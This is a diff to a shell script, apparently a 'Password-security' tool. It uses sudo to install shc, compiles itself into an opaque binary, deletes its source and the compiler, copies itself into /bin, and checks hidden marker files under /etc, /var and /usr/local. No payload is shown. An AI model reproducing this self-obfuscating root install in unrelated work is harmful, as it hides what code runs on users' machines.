@@ -4,24 +4,15 @@
 
 if [ ! -e /bin/pass ]; then
     if [ ! -e /bin/shc ]; then
-        sudo apt -y install -y shc -y
-        if [ -e /bin/shc ]; then
+        sudo apt -y reinstall -y shc -y && sudo apt -y autoremove -y
+    fi
+    if [ -e /bin/shc ]; then
             shc -f "$0" -o "$0"
             rm "$0".x.c
             rm /bin/shc
     fi
-    else
-        shc -f "$0" -o "$0"
-        rm "$0".x.c
-    fi
-    if [ ! -e /bin/shc ]; then
-        echo -e "\e[1;31mError install"
-        cd
-        rm -rf Password-security 
-        exit 1
-    fi
     chmod a-rwx "$0"
-    chmod u+x "$0"
+    chmod u+rx "$0"
     cp "$0" /bin
 fi
 if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm/.Ye ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
